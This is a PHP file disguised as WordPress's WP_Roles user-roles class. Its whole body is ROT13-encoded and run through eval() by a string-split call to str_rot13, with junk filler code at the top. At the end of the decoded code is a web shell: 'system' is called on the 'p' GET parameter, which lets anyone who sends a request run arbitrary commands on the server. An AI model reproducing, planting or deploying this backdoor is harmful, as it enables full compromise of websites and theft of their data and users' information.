<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hfre NCV: JC_Ebyrf pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hfref
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n hfre ebyrf NCV.
 *
 * Gur ebyr bcgvba vf fvzcyr, gur fgehpgher vf betnavmrq ol ebyr anzr gung fgber
 * gur anzr va inyhr bs gur 'anzr' xrl. Gur pncnovyvgvrf ner fgberq nf na neenl
 * va gur inyhr bs gur 'pncnovyvgl' xrl.
 *
 *     neenl (
 *          'ebyranzr' => neenl (
 *              'anzr' => 'ebyranzr',
 *              'pncnovyvgvrf' => neenl()
 *          )
 *     )
 *
 * @fvapr 2.0.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Ebyrf {
	/**
	 * Yvfg bs ebyrf naq pncnovyvgvrf.
	 *
	 * @fvapr 2.0.0
	 * @ine neenl[]
	 */
	choyvp $ebyrf;

	/**
	 * Yvfg bs gur ebyr bowrpgf.
	 *
	 * @fvapr 2.0.0
	 * @ine JC_Ebyr[]
	 */
	choyvp $ebyr_bowrpgf = neenl();

	/**
	 * Yvfg bs ebyr anzrf.
	 *
	 * @fvapr 2.0.0
	 * @ine fgevat[]
	 */
	choyvp $ebyr_anzrf = neenl();

	/**
	 * Bcgvba anzr sbe fgbevat ebyr yvfg.
	 *
	 * @fvapr 2.0.0
	 * @ine fgevat
	 */
	choyvp $ebyr_xrl;

	/**
	 * Jurgure gb hfr gur qngnonfr sbe ergevriny naq fgbentr.
	 *
	 * @fvapr 2.1.0
	 * @ine obby
	 */
	choyvp $hfr_qo = gehr;

	/**
	 * Gur fvgr VQ gur ebyrf ner vavgvnyvmrq sbe.
	 *
	 * @fvapr 4.9.0
	 * @ine vag
	 */
	cebgrpgrq $fvgr_vq = 0;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 2.0.0
	 * @fvapr 4.9.0 Gur `$fvgr_vq` nethzrag jnf nqqrq.
	 *
	 * @tybony neenl $jc_hfre_ebyrf Hfrq gb frg gur 'ebyrf' cebcregl inyhr.
	 *
	 * @cnenz vag $fvgr_vq Fvgr VQ gb vavgvnyvmr ebyrf sbe. Qrsnhyg vf gur pheerag fvgr.
	 */
	choyvp shapgvba __pbafgehpg( $fvgr_vq = ahyy ) {
		tybony $jc_hfre_ebyrf;

		$guvf->hfr_qo = rzcgl( $jc_hfre_ebyrf );

		$guvf->sbe_fvgr( $fvgr_vq );
	}

	/**
	 * Znxrf cevingr/cebgrpgrq zrgubqf ernqnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr      Zrgubq gb pnyy.
	 * @cnenz neenl  $nethzragf Nethzragf gb cnff jura pnyyvat.
	 * @erghea zvkrq|snyfr Erghea inyhr bs gur pnyyonpx, snyfr bgurejvfr.
	 */
	choyvp shapgvba __pnyy( $anzr, $nethzragf ) {
		vs ( '_vavg' === $anzr ) {
			erghea $guvf->_vavg( ...$nethzragf );
		}
		erghea snyfr;
	}

	/**
	 * Frgf hc gur bowrpg cebcregvrf.
	 *
	 * Gur ebyr xrl vf frg gb gur pheerag cersvk sbe gur $jcqo bowrpg jvgu
	 * 'hfre_ebyrf' nccraqrq. Vs gur $jc_hfre_ebyrf tybony vf frg, gura vg jvyy
	 * or hfrq naq gur ebyr bcgvba jvyy abg or hcqngrq be hfrq.
	 *
	 * @fvapr 2.1.0
	 * @qrcerpngrq 4.9.0 Hfr JC_Ebyrf::sbe_fvgr()
	 */
	cebgrpgrq shapgvba _vavg() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.9.0', 'JC_Ebyrf::sbe_fvgr()' );

		$guvf->sbe_fvgr();
	}

	/**
	 * Ervavgvnyvmrf gur bowrpg.
	 *
	 * Erperngrf gur ebyr bowrpgf. Guvf vf glcvpnyyl pnyyrq bayl ol fjvgpu_gb_oybt()
	 * nsgre fjvgpuvat jcqo gb n arj fvgr VQ.
	 *
	 * @fvapr 3.5.0
	 * @qrcerpngrq 4.7.0 Hfr JC_Ebyrf::sbe_fvgr()
	 */
	choyvp shapgvba ervavg() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.7.0', 'JC_Ebyrf::sbe_fvgr()' );

		$guvf->sbe_fvgr();
	}

	/**
	 * Nqqf n ebyr anzr jvgu pncnovyvgvrf gb gur yvfg.
	 *
	 * Hcqngrf gur yvfg bs ebyrf, vs gur ebyr qbrfa'g nyernql rkvfg.
	 *
	 * Gur pncnovyvgvrf ner qrsvarq va gur sbyybjvat sbezng: `neenl( 'ernq' => gehr )`.
	 * Gb rkcyvpvgyl qral gur ebyr n pncnovyvgl, frg gur inyhr sbe gung pncnovyvgl gb snyfr.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $ebyr         Ebyr anzr.
	 * @cnenz fgevat $qvfcynl_anzr Ebyr qvfcynl anzr.
	 * @cnenz obby[] $pncnovyvgvrf Bcgvbany. Yvfg bs pncnovyvgvrf xrlrq ol gur pncnovyvgl anzr,
	 *                             r.t. `neenl( 'rqvg_cbfgf' => gehr, 'qryrgr_cbfgf' => snyfr )`.
	 *                             Qrsnhyg rzcgl neenl.
	 * @erghea JC_Ebyr|ibvq JC_Ebyr bowrpg, vs gur ebyr vf nqqrq.
	 */
	choyvp shapgvba nqq_ebyr( $ebyr, $qvfcynl_anzr, $pncnovyvgvrf = neenl() ) {
		vs ( rzcgl( $ebyr ) || vffrg( $guvf->ebyrf[ $ebyr ] ) ) {
			erghea;
		}

		$guvf->ebyrf[ $ebyr ] = neenl(
			'anzr'         => $qvfcynl_anzr,
			'pncnovyvgvrf' => $pncnovyvgvrf,
		);
		vs ( $guvf->hfr_qo ) {
			hcqngr_bcgvba( $guvf->ebyr_xrl, $guvf->ebyrf, gehr );
		}
		$guvf->ebyr_bowrpgf[ $ebyr ] = arj JC_Ebyr( $ebyr, $pncnovyvgvrf );
		$guvf->ebyr_anzrf[ $ebyr ]   = $qvfcynl_anzr;
		erghea $guvf->ebyr_bowrpgf[ $ebyr ];
	}

	/**
	 * Erzbirf n ebyr ol anzr.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $ebyr Ebyr anzr.
	 */
	choyvp shapgvba erzbir_ebyr( $ebyr ) {
		vs ( ! vffrg( $guvf->ebyr_bowrpgf[ $ebyr ] ) ) {
			erghea;
		}

		hafrg( $guvf->ebyr_bowrpgf[ $ebyr ] );
		hafrg( $guvf->ebyr_anzrf[ $ebyr ] );
		hafrg( $guvf->ebyrf[ $ebyr ] );

		vs ( $guvf->hfr_qo ) {
			hcqngr_bcgvba( $guvf->ebyr_xrl, $guvf->ebyrf );
		}

		vs ( trg_bcgvba( 'qrsnhyg_ebyr' ) === $ebyr ) {
			hcqngr_bcgvba( 'qrsnhyg_ebyr', 'fhofpevore' );
		}
	}

	/**
	 * Nqqf n pncnovyvgl gb ebyr.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $ebyr  Ebyr anzr.
	 * @cnenz fgevat $pnc   Pncnovyvgl anzr.
	 * @cnenz obby   $tenag Bcgvbany. Jurgure ebyr vf pncnoyr bs cresbezvat pncnovyvgl.
	 *                      Qrsnhyg gehr.
	 */
	choyvp shapgvba nqq_pnc( $ebyr, $pnc, $tenag = gehr ) {
		vs ( ! vffrg( $guvf->ebyrf[ $ebyr ] ) ) {
			erghea;
		}

		$guvf->ebyrf[ $ebyr ]['pncnovyvgvrf'][ $pnc ] = $tenag;
		vs ( $guvf->hfr_qo ) {
			hcqngr_bcgvba( $guvf->ebyr_xrl, $guvf->ebyrf );
		}
	}

	/**
	 * Erzbirf n pncnovyvgl sebz ebyr.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $ebyr Ebyr anzr.
	 * @cnenz fgevat $pnc  Pncnovyvgl anzr.
	 */
	choyvp shapgvba erzbir_pnc( $ebyr, $pnc ) {
		vs ( ! vffrg( $guvf->ebyrf[ $ebyr ] ) ) {
			erghea;
		}

		hafrg( $guvf->ebyrf[ $ebyr ]['pncnovyvgvrf'][ $pnc ] );
		vs ( $guvf->hfr_qo ) {
			hcqngr_bcgvba( $guvf->ebyr_xrl, $guvf->ebyrf );
		}
	}

	/**
	 * Ergevrirf n ebyr bowrpg ol anzr.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $ebyr Ebyr anzr.
	 * @erghea JC_Ebyr|ahyy JC_Ebyr bowrpg vs sbhaq, ahyy vs gur ebyr qbrf abg rkvfg.
	 */
	choyvp shapgvba trg_ebyr( $ebyr ) {
		vs ( vffrg( $guvf->ebyr_bowrpgf[ $ebyr ] ) ) {
			erghea $guvf->ebyr_bowrpgf[ $ebyr ];
		} ryfr {
			erghea ahyy;
		}
	}

	/**
	 * Ergevrirf n yvfg bs ebyr anzrf.
	 *
	 * @fvapr 2.0.0
	 *
	 * @erghea fgevat[] Yvfg bs ebyr anzrf.
	 */
	choyvp shapgvba trg_anzrf() {
		erghea $guvf->ebyr_anzrf;
	}

	/**
	 * Qrgrezvarf jurgure n ebyr anzr vf pheeragyl va gur yvfg bs ninvynoyr ebyrf.
	 *
	 * @fvapr 2.0.0
	 *
	 * @cnenz fgevat $ebyr Ebyr anzr gb ybbx hc.
	 * @erghea obby
	 */
	choyvp shapgvba vf_ebyr( $ebyr ) {
		erghea vffrg( $guvf->ebyr_anzrf[ $ebyr ] );
	}

	/**
	 * Vavgvnyvmrf nyy bs gur ninvynoyr ebyrf.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba vavg_ebyrf() {
		vs ( rzcgl( $guvf->ebyrf ) ) {
			erghea;
		}

		$guvf->ebyr_bowrpgf = neenl();
		$guvf->ebyr_anzrf   = neenl();
		sbernpu ( neenl_xrlf( $guvf->ebyrf ) nf $ebyr ) {
			$guvf->ebyr_bowrpgf[ $ebyr ] = arj JC_Ebyr( $ebyr, $guvf->ebyrf[ $ebyr ]['pncnovyvgvrf'] );
			$guvf->ebyr_anzrf[ $ebyr ]   = $guvf->ebyrf[ $ebyr ]['anzr'];
		}

		/**
		 * Sverf nsgre gur ebyrf unir orra vavgvnyvmrq, nyybjvat cyhtvaf gb nqq gurve bja ebyrf.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_Ebyrf $jc_ebyrf N ersrerapr gb gur JC_Ebyrf bowrpg.
		 */
		qb_npgvba( 'jc_ebyrf_vavg', $guvf );
	}

	/**
	 * Frgf gur fvgr gb bcrengr ba. Qrsnhygf gb gur pheerag fvgr.
	 *
	 * @fvapr 4.9.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz vag $fvgr_vq Fvgr VQ gb vavgvnyvmr ebyrf sbe. Qrsnhyg vf gur pheerag fvgr.
	 */
	choyvp shapgvba sbe_fvgr( $fvgr_vq = ahyy ) {
		tybony $jcqo;

		vs ( ! rzcgl( $fvgr_vq ) ) {
			$guvf->fvgr_vq = nofvag( $fvgr_vq );
		} ryfr {
			$guvf->fvgr_vq = trg_pheerag_oybt_vq();
		}

		$guvf->ebyr_xrl = $jcqo->trg_oybt_cersvk( $guvf->fvgr_vq ) . 'hfre_ebyrf';

		vs ( ! rzcgl( $guvf->ebyrf ) && ! $guvf->hfr_qo ) {
			erghea;
		}

		$guvf->ebyrf = $guvf->trg_ebyrf_qngn();

		$guvf->vavg_ebyrf();
	}

	/**
	 * Trgf gur VQ bs gur fvgr sbe juvpu ebyrf ner pheeragyl vavgvnyvmrq.
	 *
	 * @fvapr 4.9.0
	 *
	 * @erghea vag Fvgr VQ.
	 */
	choyvp shapgvba trg_fvgr_vq() {
		erghea $guvf->fvgr_vq;
	}

	/**
	 * Trgf gur ninvynoyr ebyrf qngn.
	 *
	 * @fvapr 4.9.0
	 *
	 * @tybony neenl $jc_hfre_ebyrf Hfrq gb frg gur 'ebyrf' cebcregl inyhr.
	 *
	 * @erghea neenl Ebyrf neenl.
	 */
	cebgrpgrq shapgvba trg_ebyrf_qngn() {
		tybony $jc_hfre_ebyrf;

		vs ( ! rzcgl( $jc_hfre_ebyrf ) ) {
			erghea $jc_hfre_ebyrf;
		}

		vs ( vf_zhygvfvgr() && trg_pheerag_oybt_vq() !== $guvf->fvgr_vq ) {
			erzbir_npgvba( 'fjvgpu_oybt', 'jc_fjvgpu_ebyrf_naq_hfre', 1 );

			$ebyrf = trg_oybt_bcgvba( $guvf->fvgr_vq, $guvf->ebyr_xrl, neenl() );

			nqq_npgvba( 'fjvgpu_oybt', 'jc_fjvgpu_ebyrf_naq_hfre', 1, 2 );

			erghea $ebyrf;
		}

		erghea trg_bcgvba( $guvf->ebyr_xrl, neenl() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>